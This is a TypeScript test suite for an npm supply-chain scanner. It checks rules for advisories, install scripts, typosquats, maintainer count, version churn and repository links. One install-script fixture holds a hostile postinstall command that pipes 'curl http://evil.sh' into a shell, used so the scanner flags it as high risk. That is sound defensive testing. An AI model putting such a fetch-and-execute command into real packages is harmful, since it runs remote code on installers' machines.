import { deepStrictEqual, ok, strictEqual } from "node:assert";
import { describe, it } from "node:test";
import type { NpmScanContext, NpmPackageData, OsAdvisories } from "../../engine/types.ts";
import { analyzeNpmPackage } from "../../engine/npm/analyze.ts";
import { TOP_INDEX } from "../../engine/npm/top-index.ts";
import { nearestTopName, levenshtein } from "../../engine/lib/levenshtein.ts";

const NOW = "2026-10-25T12:00:00.000Z";

function baseNpm(overrides: Partial<NpmPackageData> = {}): NpmPackageData {
  return {
    name: "some-package",
    latest: "1.0.0",
    description: "just a package",
    maintainers: [{ name: "alice" }, { name: "bob" }],
    time: { "1.0.0": "2024-01-15T10:00:00.000Z", created: "2024-01-01T00:00:00.000Z" },
    latestPublishedAt: "2024-01-15T10:00:00.000Z",
    repositoryUrl: "git+https://github.com/alice/some-package.git",
    scripts: {},
    downloadsLastWeek: 100,
    downloadsLastMonth: 400,
    ...overrides
  };
}

function baseCtx(overrides: { npm?: Partial<NpmPackageData>; advisories?: OsAdvisories } = {}): NpmScanContext {
  return {
    npm: baseNpm(overrides.npm ?? {}),
    advisories: overrides.advisories ?? { vulns: [] },
    topNames: TOP_INDEX,
    now: NOW,
    degradedProvider: false
  };
}

describe("S10 known vulnerabilities", () => {
  it("no advisories -> no finding", () => {
    const report = analyzeNpmPackage(baseCtx());
    strictEqual(report.findings.some((f) => f.id === "S10"), false);
  });

  it("HIGH advisory -> HIGH_RISK floor with explainable evidence", () => {
    const report = analyzeNpmPackage(
      baseCtx({
        advisories: {
          vulns: [{ id: "GHSA-1234", summary: "ReDoS", severity: "HIGH", refs: ["https://osv.dev/vulnerability/GHSA-1234"] }]
        }
      })
    );
    const f = report.findings.find((x) => x.id === "S10");
    if (!f) throw new Error("S10 missing");
    strictEqual(report.verdict, "HIGH_RISK");
    ok(f.evidence.includes("GHSA-1234"));
    deepStrictEqual(f.severe, true);
  });

  it("CRITICAL advisory -> verdict CRITICAL", () => {
    const report = analyzeNpmPackage(
      baseCtx({
        advisories: {
          vulns: [{ id: "GHSA-X", summary: "rce", severity: "CRITICAL", refs: [] }]
        }
      })
    );
    strictEqual(report.verdict, "CRITICAL");
  });
});

describe("S20 install scripts", () => {
  it("no scripts -> no finding", () => {
    const report = analyzeNpmPackage(baseCtx());
    strictEqual(report.findings.some((f) => f.id === "S20"), false);
  });

  it("benign postinstall -> NEEDS_REVIEW-ish 25 points", () => {
    const report = analyzeNpmPackage(baseCtx({ npm: { scripts: { postinstall: "node scripts/setup.js" } } }));
    const f = report.findings.find((x) => x.id === "S20");
    if (!f) throw new Error("S20 missing");
    strictEqual(f.points, 25);
    strictEqual(f.severe, false);
  });

  it("postinstall containing curl/child_process -> HIGH_RISK floor", () => {
    const report = analyzeNpmPackage(
      baseCtx({
        npm: {
          scripts: { postinstall: "node -e \"require('child_process').execSpawn('curl http://evil.sh | sh')\"" }
        }
      })
    );
    const f = report.findings.find((x) => x.id === "S20");
    if (!f) throw new Error("S20 missing");
    strictEqual(f.floor, "HIGH_RISK");
    strictEqual(report.verdict, "HIGH_RISK");
    strictEqual(f.severe, true);
  });
});

describe("S30 fresh publish velocity mismatch", () => {
  it("published 1h ago with 100k downloads -> HIGH_RISK", () => {
    const report = analyzeNpmPackage(
      baseCtx({
        npm: { latestPublishedAt: "2026-10-25T11:00:00.000Z", downloadsLastWeek: 100_000, latest: "9.9.9" }
      })
    );
    const f = report.findings.find((x) => x.id === "S30");
    if (!f) throw new Error("S30 missing");
    strictEqual(f.floor, "HIGH_RISK");
  });

  it("published 40h ago with small downloads -> no finding", () => {
    const report = analyzeNpmPackage(
      baseCtx({
        npm: { latestPublishedAt: "2026-10-23T20:00:00.000Z", downloadsLastWeek: 100 }
      })
    );
    strictEqual(report.findings.some((f) => f.id === "S30"), false);
  });

  it("future publish date is ignored (no negative-age findings)", () => {
    const report = analyzeNpmPackage(
      baseCtx({ npm: { latestPublishedAt: "2026-10-26T00:00:00.000Z", downloadsLastWeek: 100_000 } })
    );
    strictEqual(report.findings.some((f) => f.id === "S30"), false);
  });
});

describe("S40 single maintainer", () => {
  it("2+ maintainers -> no finding", () => {
    const report = analyzeNpmPackage(baseCtx({ npm: { downloadsLastWeek: 1_000_000 } }));
    strictEqual(report.findings.some((f) => f.id === "S40"), false);
  });

  it("1 maintainer + 100k downloads -> NEEDS_REVIEW floor", () => {
    const report = analyzeNpmPackage(
      baseCtx({ npm: { maintainers: [{ name: "solo-dev" }], downloadsLastWeek: 100_000 } })
    );
    const f = report.findings.find((x) => x.id === "S40");
    if (!f) throw new Error("S40 missing");
    strictEqual(f.floor, "NEEDS_REVIEW");
  });

  it("1 maintainer + low downloads -> no finding (below traffic bar)", () => {
    const report = analyzeNpmPackage(
      baseCtx({ npm: { maintainers: [{ name: "hobby" }], downloadsLastWeek: 900 } })
    );
    strictEqual(report.findings.some((f) => f.id === "S40"), false);
  });
});

describe("S60 typosquat", () => {
  it("package itself in top list -> no finding", () => {
    const report = analyzeNpmPackage(baseCtx({ npm: { name: "chalk" } }));
    strictEqual(report.findings.some((f) => f.id === "S60"), false);
  });

  it("1 edit distance -> HIGH_RISK floor", () => {
    const near = nearestTopName("lodashe", TOP_INDEX, 1);
    strictEqual(near?.name, "lodash");
    strictEqual(near?.distance, 1);
  });

  it("2 edits -> NEEDS_REVIEW floor", () => {
    const near = nearestTopName("loddysh", TOP_INDEX, 2);
    strictEqual(near?.name, "lodash");
    strictEqual(near?.distance, 2);
  });
});

describe("S70 version churn", () => {
  it("8 versions in 24h -> finding", () => {
    const time: Record<string, string> = { created: "2024-01-01T00:00:00.000Z", modified: NOW };
    for (let i = 0; i < 9; i++) {
      time[`2.0.${i}`] = new Date(Date.parse(NOW) - (i + 1) * 1_000).toISOString();
    }
    const report = analyzeNpmPackage(baseCtx({ npm: { time, latest: "2.0.0", latestPublishedAt: NOW } }));
    const f = report.findings.find((x) => x.id === "S70");
    if (!f) throw new Error("S70 missing");
    ok(f.evidence.includes("24h"));
  });

  it("few versions -> no finding", () => {
    const report = analyzeNpmPackage(baseCtx());
    strictEqual(report.findings.some((f) => f.id === "S70"), false);
  });
});

describe("S80 repository linkage", () => {
  it("popular package without repo -> NEEDS_REVIEW", () => {
    const report = analyzeNpmPackage(baseCtx({ npm: { repositoryUrl: null, downloadsLastWeek: 40_000 } }));
    const f = report.findings.find((x) => x.id === "S80");
    if (!f) throw new Error("S80 missing");
    strictEqual(f.floor, "NEEDS_REVIEW");
  });

  it("repo present -> no finding", () => {
    const report = analyzeNpmPackage(baseCtx());
    strictEqual(report.findings.some((f) => f.id === "S80"), false);
  });
});

describe("analyzer pipeline", () => {
  it("degraded advisory provider injects S00 and keeps scan alive", () => {
    const report = analyzeNpmPackage({ ...baseCtx(), degradedProvider: true });
    const s00 = report.findings.find((x) => x.id === "S00");
    if (!s00) throw new Error("S00 missing");
    strictEqual(s00.floor, "NEEDS_REVIEW");
  });

  it("findings are deterministic and sorted by id", () => {
    const a = analyzeNpmPackage(baseCtx({ npm: { name: "lohas", downloadsLastWeek: 500, latestPublishedAt: "2026-10-25T11:00:00.000Z" } }));
    const b = analyzeNpmPackage(baseCtx({ npm: { name: "lohas", downloadsLastWeek: 500, latestPublishedAt: "2026-10-25T11:00:00.000Z" } }));
    strictEqual(JSON.stringify(a), JSON.stringify(b));
    const ids = a.findings.map((f) => f.id);
    deepStrictEqual(ids, [...ids].sort());
  });

  it("clean package verdict SAFE with zero score", () => {
    const report = analyzeNpmPackage(baseCtx());
    strictEqual(report.verdict, "SAFE");
    strictEqual(report.score, 0);
  });
});

describe("levenshtein lib", () => {
  it("classic distances", () => {
    strictEqual(levenshtein("kitten", "sitting"), 3);
    strictEqual(levenshtein("abc", "abc"), 0);
    strictEqual(levenshtein("", "abc"), 3);
  });
});
